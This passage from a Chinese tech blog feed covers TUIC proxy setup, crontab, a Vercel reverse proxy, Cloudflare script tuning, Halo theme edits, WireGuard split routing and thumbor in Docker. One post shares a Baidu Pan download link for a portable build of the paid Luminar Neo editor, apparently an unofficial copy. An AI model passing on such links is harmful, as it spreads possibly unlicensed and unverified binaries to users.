<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- name: tuic</span><br><span class="line">  server: www.example.com</span><br><span class="line">  port: 10443</span><br><span class="line">  type: tuic</span><br><span class="line">  uuid: 00000000-0000-0000-0000-000000000001</span><br><span class="line">  password: PASSWORD_1</span><br><span class="line">  # ip: 127.0.0.1</span><br><span class="line">  # heartbeat-interval: 10000</span><br><span class="line">  # alpn: [h3]</span><br><span class="line">  disable-sni: true</span><br><span class="line">  reduce-rtt: true</span><br><span class="line">  request-timeout: 8000</span><br><span class="line">  udp-relay-mode: native</span><br><span class="line">  # congestion-controller: bbr</span><br><span class="line">  # max-udp-relay-packet-size: 1500</span><br><span class="line">  # fast-open: true</span><br><span class="line">  # skip-cert-verify: true</span><br><span class="line">  # max-open-streams: 20</span><br><span class="line">  # sni: example.com</span><br></pre></td></tr></table></figure>
<h1 id="iOS端："><a href="#iOS端：" class="headerlink" title="iOS端："></a>iOS端：</h1><h2 id="Stash-设置"><a href="#Stash-设置" class="headerlink" title="Stash 设置"></a>Stash 设置</h2><p>进入设置——配置文件——可视化编辑——本地代理——点击右上角的+，并如下图设置：<br><img src="/img/tuic/2.webp" alt="微信截图_20230706100000"><br>如图设置完成后，拉到最下方有一个延迟测试网址，设置为<a href="http://cp.cloudflare.com,之后保存即可/">http://cp.cloudflare.com，之后保存即可</a></p>
<h1 id="安卓端："><a href="#安卓端：" class="headerlink" title="安卓端："></a>安卓端：</h1><h2 id="Nekobox-for-Android-设置"><a href="#Nekobox-for-Android-设置" class="headerlink" title="Nekobox for Android 设置"></a>Nekobox for Android 设置</h2><p>首先安装Nekobox for Android 1.1.3及以上版本（最新Release是1.1.2，需要点进Releases中才能看到1.1.3），并安装Tuic v5插件。设置如图<br><img src="/img/tuic/3.webp" alt="20230610182254-1688623239642"><br>注意：</p>
<ul>
<li>由于Tuic与Hysteria均是基于魔改Quic制作，所以Hysteria会吃IDC阻断的Tuic一样会吃，只是没有Hysteria那么容易触发ISP的QOS而已。</li>
<li>Clash Meta作为服务端可能不能使用原版Tuic作为客户端（未测试，或许也可以）</li>
</ul>
]]></content>
      <categories>
        <category>proxy</category>
        <category>tuic</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>tuic</tag>
      </tags>
  </entry>
  <entry>
    <title>luminar neo AI 摄影编辑软件</title>
    <url>/posts/deb87e36/</url>
    <content><![CDATA[<p>摄影编辑软件 Luminar Neo 支持原始文件、导出所有主要文件格式、图层、蒙版等，可满足您的所有编辑需求。</p>
<ul>
<li>AI图像增强</li>
<li>克隆工具</li>
<li>原始编辑</li>
<li>闪避和燃烧</li>
<li>图层支持</li>
<li>色彩增强</li>
<li>无损编辑</li>
<li>裁剪并调整大小</li>
<li>镜头校正</li>
</ul>
<p>Luminar Neo 拥有打造流行色彩所需的一切。 Accent AI 等工具可以通过一个滑块智能地平衡色调、饱和度、高光、对比度和细节。但是，您始终可以通过手动控制根据自己的喜好单独微调每一项。</p>
<ul>
<li>增强人工智能</li>
<li>黄金时刻</li>
<li>色彩和谐</li>
<li>超对比</li>
</ul>
<p>让您的主题让观众着迷<br>如果使用传统工具完成肖像修饰是一项艰巨而乏味的工作。 Luminar 的做法有所不同。我们的人工智能神经网络可以检测不同的面部特征，并让您直接使用它们。</p>
<ul>
<li>起源</li>
<li>皮肤</li>
<li>光</li>
<li>苗条的</li>
<li>眼睛</li>
<li>嘴唇</li>
</ul>
<p>LuminarNeo-1.11.0.11589-x64-Portable下载链接：<br>链接: <a href="https://pan.baidu.com/s/1zFyY4KF3k4r6ncvTzybCoA?pwd=pqgs">https://pan.baidu.com/s/1zFyY4KF3k4r6ncvTzybCoA?pwd=pqgs</a> 提取码: pqgs 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>ai</category>
        <category>luminar</category>
        <category>luminar</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>ai</tag>
        <tag>luminar</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu 用 crontab 定时访问 url</title>
    <url>/posts/3648f1b7/</url>
    <content><![CDATA[<h1 id="首先登陆服务器，输入编辑命令：crontab-e"><a href="#首先登陆服务器，输入编辑命令：crontab-e" class="headerlink" title="首先登陆服务器，输入编辑命令：crontab -e"></a>首先登陆服务器，输入编辑命令：crontab -e</h1><h1 id="再按【-i-】进行新增内容-2-usr-bin-curl-你的网址"><a href="#再按【-i-】进行新增内容-2-usr-bin-curl-你的网址" class="headerlink" title="再按【 i 】进行新增内容 *&#x2F;2 * * * * &#x2F;usr&#x2F;bin&#x2F;curl 你的网址"></a>再按【 i 】进行新增内容 *&#x2F;2 * * * * &#x2F;usr&#x2F;bin&#x2F;curl 你的网址</h1><p>【意思的每2分钟执行一次访问url地址】</p>
<h1 id="输入完毕即按-Esc-输入冒号-wq，回车"><a href="#输入完毕即按-Esc-输入冒号-wq，回车" class="headerlink" title="输入完毕即按 Esc  输入冒号:wq，回车"></a>输入完毕即按 Esc  输入冒号:wq，回车</h1><h1 id="保存完毕要重启crontab"><a href="#保存完毕要重启crontab" class="headerlink" title="保存完毕要重启crontab"></a>保存完毕要重启crontab</h1><p>“*” 代表取值范围内的数字,</p>
<p>“&#x2F;” 代表”每”,</p>
<p>“-” 代表从某个数字到某个数字,</p>
<p>“,” 分开几个离散的数字</p>
<p>删除定时任务  &#x2F;var&#x2F;spool&#x2F;cron 下 文件删除即可。</p>
<h1 id="crontab的几个服务命令"><a href="#crontab的几个服务命令" class="headerlink" title="crontab的几个服务命令"></a>crontab的几个服务命令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#启动服务</span><br><span class="line">service cron start             </span><br><span class="line">#关闭服务</span><br><span class="line">service cron stop             </span><br><span class="line">/#重启服务</span><br><span class="line">service cron restart         </span><br><span class="line">#重新载入配置</span><br><span class="line">service cron reload</span><br><span class="line">#服务状态</span><br><span class="line">service cron status</span><br></pre></td></tr></table></figure>

<h1 id="crontab执行时间计算"><a href="#crontab执行时间计算" class="headerlink" title="crontab执行时间计算"></a>crontab执行时间计算</h1><p><a href="https://tool.lu/crontab/">https://tool.lu/crontab/</a></p>
]]></content>
      <categories>
        <category>os</category>
        <category>ubuntu</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
      </tags>
  </entry>
  <entry>
    <title>vercel-api-proxy 自定义域名访问vercel反向代理的域名，也可用于国内github加速</title>
    <url>/posts/6aa62be7/</url>
    <content><![CDATA[<p>项目地址：<a href="https://github.com/souying/vercel-api-proxy">https://github.com/souying/vercel-api-proxy</a></p>
<p>本项目是vercel反向代理。完全免费，万能代理，可代理全网一切接口，包括openai、Midjourney、github、google、Telegram等等。http和https接口、单页面均可代理，在网络环境不好的情况下均可用。（直接浏览器打开代理页面的情况下，由于某些js和css的路径可能会不对造成访问不到不会有大的影响。）</p>
<p>(openai等接口服务大陆机器也可无需科学上网环境很稳定ip也稳定)<br>vercel现在每月有100GB的免费流量。</p>
<p>部署<br><a href="https://vercel.com/import/project?template=https://github.com/souying/vercel-api-proxy">Vercel</a></p>
<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h2 id="1-部署。部署有两种方法，一是直接点击上方按钮一键部署，二是可以先fork本项目，再登录vercel网站新建-新建项目"><a href="#1-部署。部署有两种方法，一是直接点击上方按钮一键部署，二是可以先fork本项目，再登录vercel网站新建-新建项目" class="headerlink" title="1 部署。部署有两种方法，一是直接点击上方按钮一键部署，二是可以先fork本项目，再登录vercel网站新建 新建项目"></a>1 部署。部署有两种方法，一是直接点击上方按钮一键部署，二是可以先fork本项目，再登录vercel网站新建 新建项目</h2><h2 id="2-绑定自己的域名-不是必须，使用vercel自带的子域名也可以，但是自带的域名vercel-app在国内网络环境不好的情况下不可用-可以申请tk免费域名或者薅小域名注册商首年免费羊毛-绑定域名-绑定域名时按照vercel上的说明配置即可，其实就是在你的域名上配了一个子域名，cname到vercel服务器"><a href="#2-绑定自己的域名-不是必须，使用vercel自带的子域名也可以，但是自带的域名vercel-app在国内网络环境不好的情况下不可用-可以申请tk免费域名或者薅小域名注册商首年免费羊毛-绑定域名-绑定域名时按照vercel上的说明配置即可，其实就是在你的域名上配了一个子域名，cname到vercel服务器" class="headerlink" title="2 绑定自己的域名(不是必须，使用vercel自带的子域名也可以，但是自带的域名vercel.app在国内网络环境不好的情况下不可用) 可以申请tk免费域名或者薅小域名注册商首年免费羊毛 绑定域名 绑定域名时按照vercel上的说明配置即可，其实就是在你的域名上配了一个子域名，cname到vercel服务器"></a>2 绑定自己的域名(不是必须，使用vercel自带的子域名也可以，但是自带的域名vercel.app在国内网络环境不好的情况下不可用) 可以申请tk免费域名或者薅小域名注册商首年免费羊毛 绑定域名 绑定域名时按照vercel上的说明配置即可，其实就是在你的域名上配了一个子域名，cname到vercel服务器</h2><h2 id="3-访问-域名-https-url-或者-http-url即可。-映射规则为-https-url映射到https接口，-http-url映射到http接口"><a href="#3-访问-域名-https-url-或者-http-url即可。-映射规则为-https-url映射到https接口，-http-url映射到http接口" class="headerlink" title="3 访问 域名&#x2F;https&#x2F;url 或者&#x2F;http&#x2F;url即可。 映射规则为&#x2F;https&#x2F;url映射到https接口，&#x2F;http&#x2F;url映射到http接口"></a>3 访问 域名&#x2F;https&#x2F;url 或者&#x2F;http&#x2F;url即可。 映射规则为&#x2F;https&#x2F;url映射到https接口，&#x2F;http&#x2F;url映射到http接口</h2><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><p>访问https:&#x2F;&#x2F;替换为你自己的域名.com&#x2F;https&#x2F;api.openai.com&#x2F;v1&#x2F;chat&#x2F;completions 实际上会替换为<a href="https://api.openai.com/v1/chat/completions">https://api.openai.com/v1/chat/completions</a> demo1</p>
<p>如何在一些常见的开源项目中使用？ 一般开源项目都是引用的openai的库，可以看到里面有一个属性是api_base &#x3D; os.environ.get(“OPENAI_API_BASE”, “<a href="https://api.openai.com/v1">https://api.openai.com/v1</a>“)</p>
<p>所以使用的时候只需要设置一下openai.api_base&#x3D;”https:&#x2F;&#x2F;你的域名&#x2F;https&#x2F;api.openai.com&#x2F;v1” 就可以了</p>
<h2 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h2><p>访问https:&#x2F;&#x2F;你的域名.com&#x2F;https&#x2F;github.com&#x2F;souying&#x2F;serverMmon&#x2F; 实际上会替换为<a href="https://github.com/souying/serverMmon/">https://github.com/souying/serverMmon/</a> demo2 映射规则为&#x2F;https&#x2F;url映射到https接口，&#x2F;http&#x2F;url映射到http接口</p>
<p>也可用于github下载加速。假如原始链接是<a href="https://objects.githubusercontent.com/github-production-release-asset-2e65be/xxxxxx">https://objects.githubusercontent.com/github-production-release-asset-2e65be/xxxxxx</a> 改为https:&#x2F;&#x2F;替换为你自己的域名.com&#x2F;https&#x2F;objects.githubusercontent.com&#x2F;github-production-release-asset-2e65be&#x2F;xxxxxx 就可以加速了。下图是github原始链接和加速后对比。可以看到效果杠杠的，每秒50kb小水管变成了每秒2-3mb github-download</p>
<h2 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h2><p>访问https:&#x2F;&#x2F;你的域名.com&#x2F;https&#x2F;<a href="http://www.google.com/search?q=vercel-api-proxy">www.google.com/search?q=vercel-api-proxy</a> 实际上会替换为<a href="https://www.google.com/search?q=vercel-api-proxy">https://www.google.com/search?q=vercel-api-proxy</a> demo3 代理google搜索结果页面</p>
]]></content>
      <categories>
        <category>proxy</category>
      </categories>
      <tags>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>解决 cloudflare cdn 的 rocket-loader.min.js 和 invisible.js 减慢网站加载速度的方法</title>
    <url>/posts/32f742bf/</url>
    <content><![CDATA[<p>很多小伙伴在使用Cloudflare的免费CDN后，会发现自己的WordPress网站自动被添加了rocket-loader.min.js及invisible.js两个脚本，导致加载WordPress网站总是慢一点，这两个脚本到底是干嘛的呢？能不能禁用关掉？这里给出优化rocket-loader.min.js及invisible.js这两个脚本后，加速WordPress网站访问加载的方法。</p>
<p>自动加载的脚本<br>一般我们使用Cloudflare的免费CDN来加速自己的WordPress网站后，在调试的时候会自动附带了两个额外的脚本，如下：</p>
<p>https:&#x2F;&#x2F;域名&#x2F;cdn-cgi&#x2F;scripts&#x2F;7d1fa11a&#x2F;cloudflare-static&#x2F;rocket-loader.min.js<br>https:&#x2F;&#x2F;域名&#x2F;cdn-cgi&#x2F;challenge-platform&#x2F;h&#x2F;g&#x2F;scripts&#x2F;alpha&#x2F;invisible.js</p>
<p>然后在每次网站加载的时候，都会出现这两个脚本自动加载。</p>
<p>大家也知道，在国内访问Cloudflare的话速度都不是很好，如果附带了这两个JS脚本后，速度更是大打折扣。</p>
<h1 id="rocket-loader-min-js是什么"><a href="#rocket-loader-min-js是什么" class="headerlink" title="rocket-loader.min.js是什么"></a>rocket-loader.min.js是什么</h1><p>Rocket Loader 通过将所有 JavaScript 的加载推迟到呈现之后来确定网站内容（文本、图像、字体等）的优先级。</p>
<p>这种类型的加载（称为异步加载）会导致更早呈现页面内容。Rocket Loader 处理内联和外部脚本，同时保持执行顺序。Cloudflare 将检测不兼容的浏览器并禁用 Rocket Loader。</p>
<p>在使用 JavaScript 的页面上，这会带来更快的加载体验打开外部链接为您的用户改进以下性能指标：</p>
<p>首次渲染时间 (TTFP)<br>首次内容绘制时间 (TTFCP)<br>第一次有意义的绘画时间 (TTFMP)<br>文档加载<br>简单来说就是可以延迟加载的JS脚本，但是在国内体验非常不好，加载本来就慢了，访问更加慢。，这个时候我们需要禁用该功能即可。</p>
<p><strong>一般关闭这里后即可。有的还会在规则里开启，这个时候还需要到Cloudflare的规则里关掉Rocket Loader即可。</strong></p>
<p>对于有的用百度云加速的，也会自动开启，也需要进行关闭</p>
<p>出现这个原因是由于站长在接入云加速的时候设置开启了自义规则中的 javascript快速加载 功能</p>
<h1 id="invisible-js是什么"><a href="#invisible-js是什么" class="headerlink" title="invisible.js是什么"></a>invisible.js是什么</h1><p>解决了rocket-loader.min.js后，接下来是invisible.js了。</p>
<p>Cloudflare已经开始公开测试一种CAPTCHA替代品，它在后台安静地运行，自动判断网页访问者是否是真正的人类。其目的是让网民不必在网站上完成那些乏味的 “证明你不是机器人”的测试。</p>
<p>这个小工具被称为Turnstile，被描述为当今CAPTCHA挑战的 “隐形替代品”。也就是说，如果它不能自动验证一个用户是人类，那么作为最后手段，它将退回到人工测试。Cloudflare声称它可以做到这一切，同时保持比传统验证码系统更高的隐私水平。</p>
<p>其实就是防火墙自动识别这个时候访问的是机器人还是正常访客，然后自动开启攻击防御程序。这个时候可以登录Cloudflare就能看到一些攻击的日志了。</p>
<p>这个时候可以根据自己的需要进行调整，选择降低攻击防御等级还是禁用。</p>
<p>在Cloudflare的面板【安全性】-【设置】，选择降低或者升高防御等级。</p>
<p>可以直接关掉，或者选择选择低。如果选择中甚至更高的话，那么你将见到无休止的验证，这个时候的体验是极差的。</p>
<p><strong>直接关掉的选择为Cloudflare的面板【安全性】-【自动程序】</strong></p>
<h1 id="最后总结"><a href="#最后总结" class="headerlink" title="最后总结"></a>最后总结</h1><p>把这两个JS脚本解决后，WordPress网站也加载快得多，不再被各种阻塞。搬主题的网站访问也好多了。以上就是搬主题就给出优化rocket-loader.min.js及invisible.js这两个脚本后，加速WordPress网站访问加载的方法。</p>
]]></content>
      <categories>
        <category>web</category>
        <category>cdn</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>cdn</tag>
        <tag>cloudflare</tag>
      </tags>
  </entry>
  <entry>
    <title>halo 博客自定义导航条菜单图标 iconfont</title>
    <url>/posts/d2be79e3/</url>
    <content><![CDATA[<p>主题自身已经引入了部分 iconfont 图标，你可以直接用（全在这里），如果想在这个基础上增加图标，可联系我加入该项目的图标组。iconfont 使用方式如下：</p>
<blockquote>
<p>（目前主题菜单只支持字体图标，若要用图片请自行修改代码）</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;i class=&quot;joe-font joe-icon-xxx&quot;&gt;&lt;/i&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/img/iconfont/1.webp" alt="menu"><br>如果你要用自己的图标，请往下看：<br>首先通过 <a href="https://www.iconfont.cn/">iconfont</a> 获取自己的图标链接，也可以用 <a href="http://www.fontawesome.com.cn/">fontawesome</a> 的字体，注意要使用 font-class 类型，最后得到这种地址：&#x2F;&#x2F;at.alicdn.com&#x2F;t&#x2F;font_2788564_1f1rnuqwnzj.css</p>
<p>通过 管理后台-外观-主题-Joe2.0-设置-自定义，将图标地址贴入 字体图标链接 中并保存；</p>
<p>通过 管理后台-外观-菜单，为相关菜单添加图标，也就是字体图标的类名，类似如下这种（字体名称 + 图标名称，具体以你生成时的字体名为准），记得保存；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iconfont icon-home</span><br></pre></td></tr></table></figure>
<p>最后，重新进入你的博客即可看到效果。</p>
]]></content>
      <categories>
        <category>web</category>
        <category>halo</category>
        <category>alibaba</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>halo</tag>
        <tag>alibaba</tag>
      </tags>
  </entry>
  <entry>
    <title>wireguard 对 warp 的配置进行分流</title>
    <url>/posts/ad773476/</url>
    <content><![CDATA[<h1 id="相关软件和项目"><a href="#相关软件和项目" class="headerlink" title="相关软件和项目"></a>相关软件和项目</h1><p>IP优选文件：<a href="https://drive.google.com/drive/folders/1cK2nA6SSUCzdnPn6HCaVVwIITr-U1J9Y">https://drive.google.com/drive/folders/1cK2nA6SSUCzdnPn6HCaVVwIITr-U1J9Y</a><br>获取wareguard配置文件：<a href="https://replit.com/@kelekekou8/WARPconfig-youtubeBu-Yi-Yang-De-Qiang-Ge">https://replit.com/@kelekekou8/WARPconfig-youtubeBu-Yi-Yang-De-Qiang-Ge</a><br>获取warp+密钥获取：<a href="https://replit.com/@kelekekou8/WarpKey">https://replit.com/@kelekekou8/WarpKey</a><br>电脑配合wierguard分流：<a href="https://github.com/lmc999/auto-add-routes">https://github.com/lmc999/auto-add-routes</a><br>电脑端nekoray分流：<a href="https://github.com/MatsuriDayo/nekoray">https://github.com/MatsuriDayo/nekoray</a><br>电脑端singbox配置格式下载：<a href="https://drive.google.com/drive/u/0/folders/1tEweqNOMNcu30fOTrmPOUiRJZcLV9ACD">https://drive.google.com/drive/u/0/folders/1tEweqNOMNcu30fOTrmPOUiRJZcLV9ACD</a><br>手机端分流nekobox：<a href="https://github.com/MatsuriDayo/NekoBoxForAndroid">https://github.com/MatsuriDayo/NekoBoxForAndroid</a><br>（代码分叉自开源程序github:github.com&#x2F;yonggekkk)</p>
<p>项目地址：<a href="https://github.com/lmc999/auto-add-routes">https://github.com/lmc999/auto-add-routes</a></p>
<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>Wireguard</p>
<h2 id="1-下载并安装最新版本的官方PC客户端。一般会安装在目录”C-Program-Files-WireGuard”"><a href="#1-下载并安装最新版本的官方PC客户端。一般会安装在目录”C-Program-Files-WireGuard”" class="headerlink" title="1. 下载并安装最新版本的官方PC客户端。一般会安装在目录”C:\Program Files\WireGuard”"></a>1. 下载并安装最新版本的官方PC客户端。一般会安装在目录”C:\Program Files\WireGuard”</h2><h2 id="2-开启Wireguard的Pre-Post命令支持，只能通过修改注册表的方式开启，具体操作："><a href="#2-开启Wireguard的Pre-Post命令支持，只能通过修改注册表的方式开启，具体操作：" class="headerlink" title="2. 开启Wireguard的Pre&#x2F;Post命令支持，只能通过修改注册表的方式开启，具体操作："></a>2. 开启Wireguard的Pre&#x2F;Post命令支持，只能通过修改注册表的方式开启，具体操作：</h2><p>以管理员身份运行cmd<br>输入以下命令按回车</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\Software\WireGuard /v DangerousScriptExecution /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
<p><img src="/img/wireguard/1.webp" alt="1"></p>
<h2 id="3-下载此页面中的所有文件到”C-Program-Files-WireGuard-bat”。或者直接下载解压此压缩档"><a href="#3-下载此页面中的所有文件到”C-Program-Files-WireGuard-bat”。或者直接下载解压此压缩档" class="headerlink" title="3. 下载此页面中的所有文件到”C:\Program Files\WireGuard\bat”。或者直接下载解压此压缩档"></a>3. 下载此页面中的所有文件到”C:\Program Files\WireGuard\bat”。或者直接下载解压此压缩档</h2><p><img src="/img/wireguard/2.webp" alt="2"></p>
<h2 id="4-修改Wireguard客户端配置文件，加入以下Script-Hook调用”C-Program-Files-WireGuard-bat”的批处理文件"><a href="#4-修改Wireguard客户端配置文件，加入以下Script-Hook调用”C-Program-Files-WireGuard-bat”的批处理文件" class="headerlink" title="4. 修改Wireguard客户端配置文件，加入以下Script Hook调用”C:\Program Files\WireGuard\bat”的批处理文件"></a>4. 修改Wireguard客户端配置文件，加入以下Script Hook调用”C:\Program Files\WireGuard\bat”的批处理文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PreUp = &quot;C:\Program Files\WireGuard\bat\routes-up.bat&quot;</span><br><span class="line">PostUp = &quot;C:\Program Files\WireGuard\bat\dns-up.bat&quot;</span><br><span class="line">PreDown = &quot;C:\Program Files\WireGuard\bat\routes-down.bat&quot;</span><br><span class="line">PostDown = &quot;C:\Program Files\WireGuard\bat\dns-down.bat&quot;</span><br></pre></td></tr></table></figure>
<p>将DNS指向本机以使用Overture作为DNS服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DNS = 127.0.0.1</span><br></pre></td></tr></table></figure>
<p>关闭Wireguard的kill switch并保存修改<br><img src="/img/wireguard/3.webp" alt="3"></p>
<h2 id="5-如配置正确，此时点击连接Wireguard会⑴自动调用routes-up-bat将国内IP写进系统路由表，⑵启动overture-DNS服务器"><a href="#5-如配置正确，此时点击连接Wireguard会⑴自动调用routes-up-bat将国内IP写进系统路由表，⑵启动overture-DNS服务器" class="headerlink" title="5. 如配置正确，此时点击连接Wireguard会⑴自动调用routes-up.bat将国内IP写进系统路由表，⑵启动overture DNS服务器"></a>5. 如配置正确，此时点击连接Wireguard会⑴自动调用routes-up.bat将国内IP写进系统路由表，⑵启动overture DNS服务器</h2><p>连接成功后可上ip.skk.moe测试一下看是否正确分流。</p>
]]></content>
      <categories>
        <category>proxy</category>
        <category>wireguard</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>wireguard</tag>
      </tags>
  </entry>
  <entry>
    <title>halo 博客 social.ftl 将 mail 改为 twitter svg 图标</title>
    <url>/posts/5c8a581e/</url>
    <content><![CDATA[<p>路径：&#x2F;root&#x2F;.halo&#x2F;templates&#x2F;themes&#x2F;joe2.0&#x2F;template&#x2F;module&#x2F;social.ftl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    &lt;/#if&gt;</span><br><span class="line">    &lt;#if settings.twitter??&gt;</span><br><span class="line">      &lt;a class=&quot;twitter&quot; href=&quot;$&#123;settings.twitter!&#125;&quot; target=&quot;_blank&quot; title=&quot;Twitter&quot; rel=&quot;noopener noreferrer nofollow&quot;&gt;</span><br><span class="line">        &lt;svg viewBox=&quot;0 0 280 200&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;25&quot; height=&quot;25&quot;&gt;</span><br><span class="line">  &lt;path fill=&quot;#1d9bf0&quot; d=&quot;M221.95 51.29c.15 2.17.15 4.34.15 6.53 0 66.73-50.8 143.69-143.69 143.69v-.04c-27.44.04-54.31-7.82-77.41-22.64 3.99.48 8 .72 12.02.73 22.74.02 44.83-7.61 62.72-21.66-21.61-.41-40.56-14.5-47.18-35.07 7.57 1.46 15.37 1.16 22.8-.87-23.56-4.76-40.51-25.46-40.51-49.5v-.64c7.02 3.91 14.88 6.08 22.92 6.32C11.58 63.31 4.74 33.79 18.14 10.71c25.64 31.55 63.47 50.73 104.08 52.76-4.07-17.54 1.49-35.92 14.61-48.25 20.34-19.12 52.33-18.14 71.45 2.19 11.31-2.23 22.15-6.38 32.07-12.26-3.77 11.69-11.66 21.62-22.2 27.93 10.01-1.18 19.79-3.86 29-7.95-6.78 10.16-15.32 19.01-25.2 26.16z&quot;/&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">      &lt;/a&gt;</span><br></pre></td></tr></table></figure>


<p>路径：&#x2F;root&#x2F;.halo&#x2F;templates&#x2F;themes&#x2F;joe2.0&#x2F;settings.yaml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">social:</span><br><span class="line">  label: 社交</span><br><span class="line">  items:</span><br><span class="line">    twitter:</span><br><span class="line">      name: twitter</span><br><span class="line">      label: Twitter</span><br><span class="line">      type: text</span><br><span class="line">      placeholder: &quot;Twitter主页地址&quot;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
        <category>halo</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>halo</tag>
      </tags>
  </entry>
  <entry>
    <title>thumbor 用 docker 搭建开源图像裁剪服务</title>
    <url>/posts/798c29a0/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>thumbor 是一个智能图像服务，已经在Github开源，支持按需裁剪、调整大小、应用过滤器和优化图像。用过对象存储服务的朋友可能知道，一般对象存储服务商会同时提供额外的图像处理服务（比如图像裁剪、图像水印等功能），有了thumbor之后我们完全可以自建搭建一个与之类似的图像处理服务。</p>
<p>thumbor是用Python 3开发的，官方也提供了多种安装方式，这篇文章分享下使用Docker搭建一个开源的图像裁剪服务thumbor</p>
<h1 id="准备工作-安装Docker"><a href="#准备工作-安装Docker" class="headerlink" title="准备工作 &amp; 安装Docker"></a>准备工作 &amp; 安装Docker</h1><p>还没有安装Docker服务的朋友可以参考我之前的文章安装Docker服务：Linux安装Docker与Docker常用命令</p>
<p>同时建议安装Docker compose方便后续的维护：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#下载docker-compose</span><br><span class="line">curl -L &quot;https://github.com/docker/compose/releases/download/1.25.5/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br><span class="line">#添加执行权限</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line">#创建软连接</span><br><span class="line">ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br></pre></td></tr></table></figure>
<h1 id="Docker安装thumbor"><a href="#Docker安装thumbor" class="headerlink" title="Docker安装thumbor"></a>Docker安装thumbor</h1><p>官方文档中给出的命令非常简单，只需要一行命令即可运行Docker thumbor：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -p 8888:80 minimalcompact/thumbor</span><br></pre></td></tr></table></figure>
<p>运行成功后便可访问<a href="http://ip:8888/unsafe/275x0/https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png">http://IP:8888/unsafe/275x0/https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png</a><br>进行裁剪图像，其中：</p>
<ul>
<li>275指的是裁剪后的宽度（像素）</li>
<li>0指的是裁剪后的高度，0则代表自适应</li>
<li>最后末尾给了一个需要裁剪的图像地址，这里用的百度的logo<br>不过正常的用途xiaoz是不建议直接使用上面的命令的，虽然简单，但缺少了很多自定义参数设置，接下来我会将我用到的一些参数整理出来供大家参考。</li>
</ul>
<h1 id="docker-compose安装thumbor"><a href="#docker-compose安装thumbor" class="headerlink" title="docker-compose安装thumbor"></a>docker-compose安装thumbor</h1><p>为了方面后续维护，建议使用docker-compose来进行安装。首先新建一个目录mkdir thumbor</p>
<p>然后在这个目录新建一个thumbor配置文件，命名为thumbor.conf，我用到的参数如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#裁剪最大宽度，意味着裁剪的图片不会超过此像素，默认是0（不限制）</span><br><span class="line">MAX_WIDTH = 1200</span><br><span class="line">#裁剪最大高度，意味着裁剪的图片不会超过此像素，默认是0（不限制）</span><br><span class="line">MAX_HEIGHT = 800</span><br><span class="line">#裁剪最小宽度，意味着裁剪的图片不会低于此像素，默认是1</span><br><span class="line">MIN_WIDTH = 50</span><br><span class="line">#裁剪最小高度，意味着裁剪的图片不会低于此像素，默认是1</span><br><span class="line">MIN_HEIGHT = 50</span><br><span class="line">#允许裁剪的图片的域名，支持正则表达式，支持多个图片</span><br><span class="line">ALLOWED_SOURCES = [&#x27;.+\.baidu\.com&#x27;, &#x27;.+\.bmp\.ovh&#x27;]</span><br><span class="line">#裁剪图像的质量，默认为80</span><br><span class="line">QUALITY = 80</span><br><span class="line">#图像应保留在浏览器缓存中的秒数。它与 Expires 和 Cache-Control 标头直接相关</span><br><span class="line">MAX_AGE = 7 * 24 * 60 * 60</span><br><span class="line">#当图像在检测中出现错误或延迟排队时，为图像缓存设置一个低得多的过期时间会很方便。这样浏览器将更快地请求正确的图像。</span><br><span class="line">MAX_AGE_TEMP_IMAGE = 60</span><br><span class="line">#裁剪后的图像保存到哪个引擎，下方指的是保存到本地存储，从而进行缓存</span><br><span class="line">RESULT_STORAGE = &#x27;thumbor.result_storages.file_storage&#x27;</span><br><span class="line">#原始图像保存时间</span><br><span class="line">STORAGE_EXPIRATION_SECONDS = 864000</span><br><span class="line">#裁剪后的图像保存时间</span><br><span class="line">RESULT_STORAGE_EXPIRATION_SECONDS = 864000</span><br><span class="line">#裁剪后的图片保存到哪个位置</span><br><span class="line">RESULT_STORAGE_FILE_STORAGE_ROOT_PATH = 